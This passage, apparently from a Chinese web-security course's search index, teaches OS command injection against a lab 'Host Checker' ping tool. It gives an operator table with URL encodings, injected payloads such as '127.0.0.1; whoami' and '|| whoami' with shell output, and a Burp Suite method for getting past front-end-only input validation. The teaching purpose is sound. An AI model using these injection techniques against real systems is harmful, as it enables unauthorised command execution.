\u6765\u68c0\u67e5\u529f\u80fd\uff0c\u6b63\u5982\u9884\u671f\u7684\u90a3\u6837\uff0c\u5b83\u8fd4\u56de <code>ping</code> \u547d\u4ee4\u7684\u8f93\u51fa\uff0c\u544a\u8bc9\u6211\u4eec\u672c\u5730\u4e3b\u673a\u786e\u5b9e\u5b58\u5728\uff1a</p> <p>![[Pasted image 20221210223440.png]]</p> <p>\u867d\u7136\u6211\u4eec\u65e0\u6cd5\u8bbf\u95ee Web \u5e94\u7528\u7a0b\u5e8f\u7684\u6e90\u4ee3\u7801\uff0c\u4f46\u6211\u4eec\u53ef\u4ee5\u81ea\u4fe1\u5730\u731c\u6d4b\u6211\u4eec\u8f93\u5165\u7684 IP \u5c06\u8fdb\u5165 <code>ping</code> \u547d\u4ee4\uff0c\u56e0\u4e3a\u6211\u4eec\u6536\u5230\u7684\u8f93\u51fa\u8868\u660e\u4e86\u8fd9\u4e00\u70b9\u3002\u7531\u4e8eping\u547d\u4ee4\u4e2d\u663e\u793a\u7684\u662f\u5355\u4e2a\u5305\u4f20\u8f93\uff0c\u4f7f\u7528\u7684\u547d\u4ee4\u53ef\u80fd\u5982\u4e0b\uff1a</p> <pre><code>ping -c 1 OUR_INPUT\n</code></pre> <p>\u5982\u679c\u6211\u4eec\u7684\u8f93\u5165\u5728\u4e0e <code>ping</code> \u547d\u4ee4\u4e00\u8d77\u4f7f\u7528\u4e4b\u524d\u6ca1\u6709\u7ecf\u8fc7\u6e05\u7406\u548c\u8f6c\u4e49\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u6ce8\u5165\u53e6\u4e00\u4e2a\u4efb\u610f\u547d\u4ee4\u3002\u56e0\u6b64\uff0c\u8ba9\u6211\u4eec\u5c1d\u8bd5\u67e5\u770b Web \u5e94\u7528\u7a0b\u5e8f\u662f\u5426\u5bb9\u6613\u53d7\u5230\u64cd\u4f5c\u7cfb\u7edf\u547d\u4ee4\u6ce8\u5165\u7684\u653b\u51fb\u3002</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/#_5","title":"\u547d\u4ee4\u6ce8\u5165\u68c0\u6d4b\u65b9\u6cd5","text":"<p>\u8981\u5411\u9884\u671f\u7684\u547d\u4ee4\u6ce8\u5165\u989d\u5916\u7684\u547d\u4ee4\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u4efb\u4f55\u64cd\u4f5c\u7b26\uff1a</p> \u6ce8\u5165\u5b57\u7b26 Url \u7f16\u7801\u5b57\u7b26 \u9002\u7528\u7cfb\u7edf <code>;</code> <code>%3b</code> Both <code>\\n</code> <code>%0a</code> Both <code>&amp;</code> <code>%26</code> Both(\u7b2c\u4e8c\u4e2a\u8f93\u51fa\u901a\u5e38\u9996\u5148\u663e\u793a) <code>|</code> <code>%7c</code> Both(\u53ea\u663e\u793a\u7b2c\u4e8c\u4e2a\u8f93\u51fa) <code>&amp;&amp;</code> <code>%26%26</code> Both(only if first succeeds) <code>||</code> <code>%7c%7c</code> Second (only if first fails) <code>``</code> <code>%60%60</code> Both (Linux-only) <code>$()</code> <code>%24%28%29</code> Both (Linux-only) <p>\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e9b\u8fd0\u7b97\u7b26\u4e2d\u7684\u4efb\u4f55\u4e00\u4e2a\u6765\u6ce8\u5165\u53e6\u4e00\u4e2a\u547d\u4ee4\uff0c\u4ee5\u4fbf\u6267\u884c\u4e24\u4e2a\u6216\u5176\u4e2d\u4e00\u4e2a\u547d\u4ee4\u3002\u6211\u4eec\u5c06\u7f16\u5199\u6211\u4eec\u9884\u671f\u7684\u8f93\u5165\uff08\u4f8b\u5982\uff0cIP\uff09\uff0c\u7136\u540e\u4f7f\u7528\u4e0a\u8ff0\u4efb\u4f55\u8fd0\u7b97\u7b26\uff0c\u7136\u540e\u7f16\u5199\u6211\u4eec\u7684\u65b0\u547d\u4ee4\u3002</p> <p>\u63d0\u793a\uff1a\u9664\u4e86\u4e0a\u8ff0\u4e4b\u5916\uff0c\u8fd8\u6709\u4e00\u4e9b unix-only \u64cd\u4f5c\u7b26\uff0c\u53ef\u4ee5\u5728 Linux \u548c macOS \u4e0a\u8fd0\u884c\uff0c\u4f46\u4e0d\u80fd\u5728 Windows \u4e0a\u8fd0\u884c\uff0c\u4f8b\u5982\u7528\u53cc\u53cd\u5f15\u53f7 (<code>``</code>) \u6216 sub-shell \u8fd0\u7b97\u7b26 (<code>$()</code>)\u3002</p> <p>\u4e00\u822c\u6765\u8bf4\uff0c\u5bf9\u4e8e\u57fa\u672c\u7684\u547d\u4ee4\u6ce8\u5165\uff0c\u8fd9\u4e9b\u64cd\u4f5c\u7b26\u90fd\u53ef\u4ee5\u7528\u4e8e\u547d\u4ee4\u6ce8\u5165\uff0c\u4e0d\u7ba1\u662f\u4ec0\u4e48<code>Web\u5e94\u7528\u7a0b\u5e8f\u8bed\u8a00\u3001\u6846\u67b6\u3001\u540e\u7aef\u670d\u52a1\u5668</code>\u3002\u56e0\u6b64\uff0c\u5982\u679c\u6211\u4eec\u6ce8\u5165\u5728 <code>Linux</code> \u670d\u52a1\u5668\u4e0a\u8fd0\u884c\u7684 PHP <code>Web</code> \u5e94\u7528\u7a0b\u5e8f\uff0c\u6216\u5728 <code>Windows</code> \u540e\u7aef\u670d\u52a1\u5668\u4e0a\u8fd0\u884c\u7684 <code>.Net</code> Web \u5e94\u7528\u7a0b\u5e8f\uff0c\u6216\u5728 <code>macOS</code> \u540e\u7aef\u670d\u52a1\u5668\u4e0a\u8fd0\u884c\u7684 <code>NodeJS</code> Web \u5e94\u7528\u7a0b\u5e8f\uff0c\u6211\u4eec\u7684\u6ce8\u5165\u5e94\u8be5\u90fd\u80fd\u6b63\u5e38\u5de5\u4f5c\u3002</p> <p>\u6ce8\u610f\uff1a\u552f\u4e00\u7684\u4f8b\u5916\u53ef\u80fd\u662f\u5206\u53f7 <code>;</code> \uff0c\u5982\u679c\u547d\u4ee4\u662f\u4f7f\u7528 Windows \u547d\u4ee4\u884c (<code>CMD</code>) \u6267\u884c\u7684\uff0c\u5b83\u5c06\u4e0d\u8d77\u4f5c\u7528\uff0c\u4f46\u5982\u679c\u5b83\u662f\u4f7f\u7528 <code>Windows PowerShell</code> \u6267\u884c\u7684\uff0c\u5b83\u5c06\u4ecd\u7136\u6709\u6548\u3002</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/#_6","title":"\u6ce8\u5165\u547d\u4ee4","text":"<p>\u5230\u76ee\u524d\u4e3a\u6b62\uff0c\u6211\u4eec\u5df2\u7ecf\u53d1\u73b0 <code>Host Checker</code> Web \u5e94\u7528\u7a0b\u5e8f\u53ef\u80fd\u5bb9\u6613\u53d7\u5230\u547d\u4ee4\u6ce8\u5165\u7684\u653b\u51fb\uff0c\u5e76\u8ba8\u8bba\u4e86\u6211\u4eec\u53ef\u80fd\u7528\u6765\u5229\u7528\u8be5 Web \u5e94\u7528\u7a0b\u5e8f\u7684\u5404\u79cd\u6ce8\u5165\u65b9\u6cd5\u3002\u56e0\u6b64\uff0c\u8ba9\u6211\u4eec\u4f7f\u7528\u5206\u53f7\u8fd0\u7b97\u7b26 (<code>;</code>) \u5f00\u59cb\u6211\u4eec\u7684\u547d\u4ee4\u6ce8\u5165\u5c1d\u8bd5\u3002</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/#_7","title":"\u6ce8\u5165\u6211\u4eec\u7684\u547d\u4ee4","text":"<p>\u6211\u4eec\u53ef\u4ee5\u5728\u8f93\u5165 IP <code>127.0.0.1</code> \u540e\u6dfb\u52a0\u4e00\u4e2a\u5206\u53f7\uff0c\u7136\u540e\u9644\u52a0\u6211\u4eec\u7684\u547d\u4ee4\uff08\u4f8b\u5982 <code>whoami</code>\uff09\uff0c\u8fd9\u6837\u6211\u4eec\u5c06\u4f7f\u7528\u7684\u6700\u7ec8 payload \u662f\uff08<code>127.0.0.1; whoami</code>\uff09\uff0c\u6700\u540e\u8981\u6267\u884c\u7684\u547d\u4ee4\u5c06\u662f\u662f\uff1a</p> <pre><code>ping -c 1 127.0.0.1; whoami\n</code></pre> <p>\u9996\u5148\uff0c\u8ba9\u6211\u4eec\u5c1d\u8bd5\u5728\u6211\u4eec\u7684 Linux VM \u4e0a\u8fd0\u884c\u4e0a\u9762\u7684\u547d\u4ee4\u4ee5\u786e\u4fdd\u5b83\u786e\u5b9e\u8fd0\u884c\uff1a</p> <pre><code>$ ping -c 1 127.0.0.1; whoami\n\nPING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=1.03 ms\n\n--- 127.0.0.1 ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss, time 0ms\nrtt min/avg/max/mdev = 1.034/1.034/1.034/0.000 ms\n21y4d\n</code></pre> <p>\u5982\u6211\u4eec\u6240\u89c1\uff0c\u6700\u7ec8\u547d\u4ee4\u6210\u529f\u8fd0\u884c\uff0c\u5e76\u4e14\u6211\u4eec\u83b7\u5f97\u4e86\u4e24\u4e2a\u547d\u4ee4\u7684\u8f93\u51fa\uff08\u5982\u524d\u8868\u4e2d\u63d0\u5230\u7684 ;\uff09\u3002\u73b0\u5728\uff0c\u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u5728 <code>Host Checker</code> Web \u5e94\u7528\u7a0b\u5e8f\u4e2d\u4f7f\u7528\u6211\u4eec\u4e4b\u524d\u7684\u6709\u6548 payload\uff1a</p> <p>![[Pasted image 20221210231255.png]]</p> <p>\u6b63\u5982\u6211\u4eec\u6240\u89c1\uff0cWeb \u5e94\u7528\u7a0b\u5e8f\u62d2\u7edd\u4e86\u6211\u4eec\u7684\u8f93\u5165\uff0c\u56e0\u4e3a\u5b83\u4f3c\u4e4e\u53ea\u63a5\u53d7 IP \u683c\u5f0f\u7684\u8f93\u5165\u3002\u4f46\u662f\uff0c\u4ece\u9519\u8bef\u6d88\u606f\u7684\u5916\u89c2\u6765\u770b\uff0c\u5b83\u4f3c\u4e4e\u6765\u81ea\u524d\u7aef\u800c\u4e0d\u662f\u540e\u7aef\u3002\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5355\u51fb <code>[CTRL + SHIFT + E]</code> \u663e\u793a\u7f51\u7edc\u9009\u9879\u5361\uff0c\u7136\u540e\u518d\u6b21\u5355\u51fb\u68c0\u67e5\u6309\u94ae\uff0c\u4f7f\u7528 Firefox \u5f00\u53d1\u4eba\u5458\u5de5\u5177\u4ed4\u7ec6\u68c0\u67e5\uff1a</p> <p>![[Pasted image 20221210231337.png]]</p> <p>\u6b63\u5982\u6211\u4eec\u6240\u770b\u5230\u7684\uff0c\u5f53\u6211\u4eec\u70b9\u51fb\u68c0\u67e5\u6309\u94ae\u65f6\u6ca1\u6709\u65b0\u7684\u7f51\u7edc\u8bf7\u6c42\u53d1\u51fa\uff0c\u4f46\u6211\u4eec\u6536\u5230\u4e86\u4e00\u6761\u9519\u8bef\u6d88\u606f\u3002\u8fd9\u8868\u660e\u7528\u6237\u8f93\u5165\u9a8c\u8bc1\u53d1\u751f\u5728\u524d\u7aef\u3002</p> <p>\u8fd9\u4f3c\u4e4e\u662f\u8bd5\u56fe\u901a\u8fc7\u4ec5\u5141\u8bb8\u7528\u6237\u4ee5 IP \u683c\u5f0f\u8f93\u5165\u6765\u963b\u6b62\u6211\u4eec\u53d1\u9001\u6076\u610f\u8d1f\u8f7d\u3002\u4f46\u662f\uff0c\u5f00\u53d1\u4eba\u5458\u901a\u5e38\u53ea\u5728\u524d\u7aef\u6267\u884c\u8f93\u5165\u9a8c\u8bc1\uff0c\u800c\u4e0d\u5728\u540e\u7aef\u9a8c\u8bc1\u6216\u6e05\u7406\u8f93\u5165\u3002\u53d1\u751f\u8fd9\u79cd\u60c5\u51b5\u7684\u539f\u56e0\u6709\u5f88\u591a\uff0c\u6bd4\u5982\u6709\u4e24\u4e2a\u4e0d\u540c\u7684\u56e2\u961f\u5728\u524d\u7aef/\u540e\u7aef\u5de5\u4f5c\uff0c\u6216\u8005\u4fe1\u4efb\u524d\u7aef\u9a8c\u8bc1\u6765\u9632\u6b62\u6076\u610f payload\u3002</p> <p>\u7136\u800c\uff0c\u6b63\u5982\u6211\u4eec\u5c06\u770b\u5230\u7684\uff0c\u524d\u7aef\u9a8c\u8bc1\u901a\u5e38\u4e0d\u8db3\u4ee5\u9632\u6b62\u6ce8\u5165\uff0c\u56e0\u4e3a\u901a\u8fc7\u5c06\u81ea\u5b9a\u4e49 HTTP \u8bf7\u6c42\u76f4\u63a5\u53d1\u9001\u5230\u540e\u7aef\u53ef\u4ee5\u5f88\u5bb9\u6613\u5730\u7ed5\u8fc7\u5b83\u4eec\u3002</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/#_8","title":"\u7ed5\u8fc7\u524d\u6bb5\u9a8c\u8bc1","text":"<p>\u81ea\u5b9a\u4e49\u53d1\u9001\u5230\u540e\u7aef\u670d\u52a1\u5668\u7684 HTTP \u8bf7\u6c42\u7684\u6700\u7b80\u5355\u65b9\u6cd5\u662f\u4f7f\u7528\u53ef\u4ee5\u62e6\u622a\u5e94\u7528\u7a0b\u5e8f\u53d1\u9001\u7684 HTTP \u8bf7\u6c42\u7684 Web \u4ee3\u7406\u3002\u4e3a\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u542f\u52a8 <code>Burp Suite</code> \u6216 <code>ZAP</code> \u5e76\u914d\u7f6e Firefox \u4ee5\u4ee3\u7406\u901a\u8fc7\u5b83\u4eec\u7684\u6d41\u91cf\u3002\u7136\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u542f\u7528\u4ee3\u7406\u62e6\u622a\u529f\u80fd\uff0c\u4ece\u4efb\u4f55IP\uff08\u4f8b\u5982<code>127.0.0.1</code>\uff09\u7684Web\u5e94\u7528\u7a0b\u5e8f\u53d1\u9001\u6807\u51c6\u8bf7\u6c42\uff0c\u5e76\u901a\u8fc7\u70b9\u51fb<code>[CTRL + R]</code>\u5c06\u62e6\u622a\u7684HTTP\u8bf7\u6c42\u53d1\u9001\u5230\u8f6c\u53d1\u5668\uff0c\u6211\u4eec\u5e94\u8be5\u6709HTTP\u5b9a\u5236\u8981\u6c42\uff1a</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/#burp-post","title":"Burp POST \u8bf7\u6c42","text":"<p>![[Pasted image 20221210231608.png]]</p> <p>\u6211\u4eec\u73b0\u5728\u53ef\u4ee5\u81ea\u5b9a\u4e49\u6211\u4eec\u7684 HTTP \u8bf7\u6c42\u5e76\u53d1\u9001\u5b83\u4ee5\u67e5\u770b Web \u5e94\u7528\u7a0b\u5e8f\u5982\u4f55\u5904\u7406\u5b83\u3002\u6211\u4eec\u5c06\u4ece\u4f7f\u7528\u4e4b\u524d\u76f8\u540c\u7684\u6709\u6548\u8d1f\u8f7d (<code>127.0.0.1; whoami</code>) \u5f00\u59cb\u3002\u6211\u4eec\u8fd8\u5e94\u8be5\u5bf9\u6211\u4eec\u7684\u6709\u6548\u8d1f\u8f7d\u8fdb\u884c URL \u7f16\u7801\uff0c\u4ee5\u786e\u4fdd\u5b83\u6309\u6211\u4eec\u7684\u610f\u56fe\u53d1\u9001\u3002\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u9009\u62e9\u6709\u6548\u8d1f\u8f7d\u7136\u540e\u5355\u51fb <code>[CTRL + U]</code> \u6765\u5b8c\u6210\u6b64\u64cd\u4f5c\u3002\u6700\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u70b9\u51fb <code>Send</code> \u6765\u53d1\u9001\u6211\u4eec\u7684 HTTP \u8bf7\u6c42\uff1a</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/#burp-post_1","title":"Burp POST \u8bf7\u6c42","text":"<p>![[Pasted image 20221210231702.png]]</p> <p>\u6b63\u5982\u6211\u4eec\u6240\u770b\u5230\u7684\uff0c\u8fd9\u6b21\u6211\u4eec\u5f97\u5230\u7684\u54cd\u5e94\u5305\u542b\u4e86 <code>ping</code> \u547d\u4ee4\u7684\u8f93\u51fa\u548c <code>whoami</code> \u547d\u4ee4\u7684\u7ed3\u679c\uff0c\u8fd9\u610f\u5473\u7740\u6211\u4eec\u6210\u529f\u5730\u6ce8\u5165\u4e86\u6211\u4eec\u7684\u65b0\u547d\u4ee4\u3002</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/#_9","title":"\u5176\u4ed6\u6ce8\u5165\u64cd\u4f5c","text":"<p>\u5728\u6211\u4eec\u7ee7\u7eed\u4e4b\u524d\uff0c\u8ba9\u6211\u4eec\u5c1d\u8bd5\u4e00\u4e9b\u5176\u4ed6\u7684\u6ce8\u5165\u64cd\u4f5c\u7b26\uff0c\u770b\u770b Web \u5e94\u7528\u7a0b\u5e8f\u5904\u7406\u5b83\u4eec\u7684\u65b9\u5f0f\u6709\u4f55\u4e0d\u540c\u3002</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/#and","title":"AND \u64cd\u4f5c","text":"<p>\u6211\u4eec\u53ef\u4ee5\u4ece <code>AND</code> (<code>&amp;&amp;</code>) \u8fd0\u7b97\u7b26\u5f00\u59cb\uff0c\u8fd9\u6837\u6211\u4eec\u7684\u6700\u7ec8\u6709\u6548\u8d1f\u8f7d\u5c06\u662f (<code>127.0.0.1 &amp;&amp; whoami</code>)\uff0c\u6700\u7ec8\u6267\u884c\u7684\u547d\u4ee4\u5982\u4e0b\uff1a</p> <pre><code>ping -c 1 127.0.0.1 &amp;&amp; whoami\n</code></pre> <p>\u4e00\u5982\u65e2\u5f80\uff0c\u8ba9\u6211\u4eec\u5148\u5c1d\u8bd5\u5728\u6211\u4eec\u7684 Linux VM \u4e0a\u8fd0\u884c\u8be5\u547d\u4ee4\uff0c\u4ee5\u786e\u4fdd\u5b83\u662f\u4e00\u4e2a\u6709\u6548\u7684\u547d\u4ee4\uff1a</p> <pre><code>$ ping -c 1 127.0.0.1 &amp;&amp; whoami\n\nPING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=1.03 ms\n\n--- 127.0.0.1 ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss, time 0ms\nrtt min/avg/max/mdev = 1.034/1.034/1.034/0.000 ms\n21y4d\n</code></pre> <p>\u5982\u6211\u4eec\u6240\u89c1\uff0c\u8be5\u547d\u4ee4\u786e\u5b9e\u8fd0\u884c\u4e86\uff0c\u5e76\u4e14\u6211\u4eec\u5f97\u5230\u4e86\u4e0e\u4e4b\u524d\u76f8\u540c\u7684\u8f93\u51fa\u3002\u5c1d\u8bd5\u53c2\u8003\u4e0a\u4e00\u8282\u7684\u6ce8\u5165\u8fd0\u7b97\u7b26\u8868\uff0c\u770b\u770b <code>&amp;&amp;</code> \u8fd0\u7b97\u7b26\u6709\u4f55\u4e0d\u540c\uff08\u5982\u679c\u6211\u4eec\u4e0d\u5199IP\uff0c\u76f4\u63a5\u7528 <code>&amp;&amp;</code> \u542f\u52a8\uff0c\u547d\u4ee4\u8fd8\u80fd\u7528\u5417\uff1f\uff09\u3002</p> <p>\u73b0\u5728\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u590d\u5236\u6211\u4eec\u7684\u6709\u6548\u8d1f\u8f7d\uff0c\u5c06\u5176\u7c98\u8d34\u5230 <code>Burp Suite</code> \u4e2d\u7684 HTTP \u8bf7\u6c42\u4e2d\uff0c\u5bf9\u5176\u8fdb\u884c URL \u7f16\u7801\uff0c\u7136\u540e\u6700\u540e\u53d1\u9001\u5b83\u6765\u505a\u4e0e\u4e4b\u524d\u76f8\u540c\u7684\u4e8b\u60c5\uff1a</p> <p>![[Pasted image 20221210232046.png]]</p> <p>\u6b63\u5982\u6211\u4eec\u6240\u770b\u5230\u7684\uff0c\u6211\u4eec\u6210\u529f\u5730\u6ce8\u5165\u4e86\u6211\u4eec\u7684\u547d\u4ee4\u5e76\u6536\u5230\u4e86\u4e24\u4e2a\u547d\u4ee4\u7684\u9884\u671f\u8f93\u51fa\u3002</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/#or","title":"OR \u64cd\u4f5c","text":"<p>\u6700\u540e\uff0c\u8ba9\u6211\u4eec\u8bd5\u8bd5 <code>OR</code> (<code>||</code>) \u6ce8\u5165\u8fd0\u7b97\u7b26\u3002 <code>OR</code> \u8fd0\u7b97\u7b26\u4ec5\u5728\u7b2c\u4e00\u4e2a\u547d\u4ee4\u6267\u884c\u5931\u8d25\u65f6\u624d\u6267\u884c\u7b2c\u4e8c\u4e2a\u547d\u4ee4\u3002\u5982\u679c\u6211\u4eec\u7684\u6ce8\u5165\u4f1a\u7834\u574f\u539f\u59cb\u547d\u4ee4\uff0c\u800c\u6ca1\u6709\u53ef\u9760\u7684\u65b9\u6cd5\u8ba9\u4e24\u4e2a\u547d\u4ee4\u90fd\u8d77\u4f5c\u7528\uff0c\u8fd9\u53ef\u80fd\u5bf9\u6211\u4eec\u6709\u7528\u3002\u56e0\u6b64\uff0c\u5982\u679c\u7b2c\u4e00\u4e2a\u547d\u4ee4\u5931\u8d25\uff0c\u4f7f\u7528 <code>OR</code> \u8fd0\u7b97\u7b26\u5c06\u4f7f\u6211\u4eec\u7684\u65b0\u547d\u4ee4\u6267\u884c\u3002</p> <p>\u5982\u679c\u6211\u4eec\u5c1d\u8bd5\u5c06\u6211\u4eec\u901a\u5e38\u7684\u6709\u6548\u8d1f\u8f7d\u4e0e <code>||</code> \u4e00\u8d77\u4f7f\u7528operator (<code>127.0.0.1 || whoami</code>)\uff0c\u6211\u4eec\u5c06\u770b\u5230\u53ea\u6709\u7b2c\u4e00\u4e2a\u547d\u4ee4\u4f1a\u6267\u884c\uff1a</p> <pre><code>$ ping -c 1 127.0.0.1 || whoami\n\nPING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.635 ms\n\n--- 127.0.0.1 ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss, time 0ms\nrtt min/avg/max/mdev = 0.635/0.635/0.635/0.000 ms\n</code></pre> <p>\u8fd9\u662f\u56e0\u4e3a <code>bash</code> \u547d\u4ee4\u7684\u5de5\u4f5c\u65b9\u5f0f\u3002\u5f53\u7b2c\u4e00\u4e2a\u547d\u4ee4\u8fd4\u56de\u9000\u51fa\u4ee3\u7801 <code>0</code> \u8868\u793a\u6267\u884c\u6210\u529f\u65f6\uff0c<code>bash</code> \u547d\u4ee4\u505c\u6b62\u5e76\u4e14\u4e0d\u4f1a\u5c1d\u8bd5\u5176\u4ed6\u547d\u4ee4\u3002\u5982\u679c\u7b2c\u4e00\u4e2a\u547d\u4ee4\u5931\u8d25\u5e76\u8fd4\u56de\u9000\u51fa\u4ee3\u7801 <code>1</code>\uff0c\u5b83\u53ea\u4f1a\u5c1d\u8bd5\u6267\u884c\u53e6\u4e00\u4e2a\u547d\u4ee4\u3002</p> <p>\u5c1d\u8bd5\u5728 HTTP \u8bf7\u6c42\u4e2d\u4f7f\u7528\u4e0a\u8ff0\u8d1f\u8f7d\uff0c\u5e76\u67e5\u770b Web \u5e94\u7528\u7a0b\u5e8f\u5982\u4f55\u5904\u7406\u5b83\u3002</p> <p>\u8ba9\u6211\u4eec\u5c1d\u8bd5\u901a\u8fc7\u4e0d\u63d0\u4f9b IP \u5e76\u76f4\u63a5\u4f7f\u7528 <code>||</code> \u6765\u6545\u610f\u7834\u574f\u7b2c\u4e00\u4e2a\u547d\u4ee4\u8fd0\u7b97\u7b26 (<code>|| whoami</code>)\uff0c\u8fd9\u6837 <code>ping</code> \u547d\u4ee4\u5c31\u4f1a\u5931\u8d25\uff0c\u6211\u4eec\u6ce8\u5165\u7684\u547d\u4ee4\u5c31\u4f1a\u88ab\u6267\u884c\uff1a</p> <pre><code>$ ping -c 1 || whoami\n\nping: usage error: Destination address required\n21y4d\n</code></pre> <p>\u6b63\u5982\u6211\u4eec\u6240\u89c1\uff0c\u8fd9\u4e00\u6b21\uff0c<code>whoami</code> \u547d\u4ee4\u786e\u5b9e\u5728 <code>ping</code> \u547d\u4ee4\u5931\u8d25\u540e\u6267\u884c\uff0c\u5e76\u7ed9\u4e86\u6211\u4eec\u4e00\u6761\u9519\u8bef\u6d88\u606f\u3002\u90a3\u4e48\uff0c\u73b0\u5728\u8ba9\u6211\u4eec\u5728 HTTP \u8bf7\u6c42\u4e2d\u5c1d\u8bd5 (<code>|| whoami</code>) \u6709\u6548\u8d1f\u8f7d\uff1a</p> <p>![[Pasted image 20221211215114.png]]</p> <p>\u6211\u4eec\u770b\u5230\u8fd9\u6b21\u6211\u4eec\u53ea\u5f97\u5230\u4e86\u9884\u671f\u7684\u7b2c\u4e8c\u6761\u547d\u4ee4\u7684\u8f93\u51fa\u3002\u6709\u4e86\u8fd9\u4e2a\uff0c\u6211\u4eec\u4f7f\u7528\u4e86\u66f4\u7b80\u5355\u7684\u6709\u6548\u8f7d\u8377\u5e76\u83b7\u5f97\u4e86\u66f4\u6e05\u6670\u7684\u7ed3\u679c\u3002</p> <p>\u5728\u8fd9\u4e2a\u6a21\u5757\u4e2d\uff0c\u6211\u4eec\u4e3b\u8981\u5904\u7406\u76f4\u63a5\u547d\u4ee4\u6ce8\u5165\uff0c\u6211\u4eec\u7684\u8f93\u5165\u76f4\u63a5\u8fdb\u5165\u7cfb\u7edf\u547d\u4ee4\uff0c\u6211\u4eec\u63a5\u6536\u547d\u4ee4\u7684\u8f93\u51fa\u3002\u6709\u5173\u9ad8\u7ea7\u547d\u4ee4\u6ce8\u5165\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u5982\u95f4\u63a5\u6ce8\u5165\u6216\u76f2\u6ce8\uff0c\u60a8\u53ef\u4ee5\u53c2\u8003 Whitebox Pentesting 101\uff1a\u547d\u4ee4\u6ce8\u5165\u6a21\u5757\uff0c\u5176\u4e2d\u6db5\u76d6\u4e86\u9ad8\u7ea7\u6ce8\u5165\u65b9\u6cd5\u548c\u8bb8\u591a\u5176\u4ed6\u4e3b\u9898\u3002</p>"},{"location":"WEB%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/#_10","title":"\u7ed5\u8fc7\u8fc7\u6ee4\u5668","text":""},{"location":"WEB%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/#_11","title":"\u8bc6\u522b\u8fc7\u6ee4\u5668","text":"<p>\u6b63\u5982\u6211\u4eec\u5728\u4e0a\u4e00\u8282\u4e2d\u770b\u5230\u7684\u90a3\u6837\uff0c\u5373\u4f7f\u5f00\u53d1\u4eba\u5458\u8bd5\u56fe\u4fdd\u62a4 Web \u5e94\u7528\u7a0b\u5e8f\u514d\u53d7\u6ce8\u5165\u653b\u51fb\uff0c\u5982\u679c\u5b83\u6ca1\u6709\u5b89\u5168\u7f16\u7801\uff0c\u5b83\u4ecd\u7136\u53ef\u80fd\u88ab\u5229\u7528\u3002\u53e6\u4e00\u79cd\u6ce8\u5165\u7f13\u89e3\u63aa\u65bd\u662f\u5728\u540e\u7aef\u4f7f\u7528\u5217\u5165\u9ed1\u540d\u5355\u7684\u5b57\u7b26\u548c\u5355\u8bcd\u6765\u68c0\u6d4b\u6ce8\u5165\u5c1d\u8bd5\uff0c\u5982\u679c\u4efb\u4f55\u8bf7\u6c42\u5305\u542b\u5b83\u4eec\uff0c\u5219\u62d2\u7edd\u8be5\u8bf7\u6c42\u3002\u5728\u6b64\u4e4b\u4e0a\u7684\u53e6\u4e00\u5c42\u662f\u5229\u7528 Web \u5e94\u7528\u7a0b\u5e8f\u9632\u706b\u5899 